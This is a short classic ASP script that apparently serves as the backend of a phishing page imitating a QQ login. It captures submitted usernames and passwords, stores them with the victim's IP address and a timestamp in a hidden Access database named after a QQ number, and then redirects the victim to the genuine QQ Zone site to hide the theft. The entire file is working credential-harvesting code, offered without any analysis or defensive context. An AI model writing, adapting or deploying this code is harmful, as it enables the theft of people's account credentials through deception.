<%@LANGUAGE="VBScript" codepage="936"%>
<%
set conn=server.CreateObject("adodb.connection")
conn.connectionstring="Provider=Microsoft.jet.oledb.4.0;data source="& server.MapPath("mdb/#qq27490123#.mdb")
conn.open()

set rs=server.createobject("adodb.recordset")
sql="select user,pass,ip,data from main"
rs.open sql,conn,1,3
rs.addnew

user=request("user")
pass=request("pass")
ip=request.ServerVariables("REMOTE_ADDR")

if user="" or pass="" then 
response.Write("<script language=javascript>alert('请输入正确的用户名和密码!');history.go(-1)</script>") 
response.end
end if

rs("ip")=ip
rs("data")=now()
rs("user")=user
rs("pass")=pass
rs.update
rs.close
set rs=nothing
conn.close
response.Write("<script>top.location='http://qzone.qq.com/qq';</script>")
%>
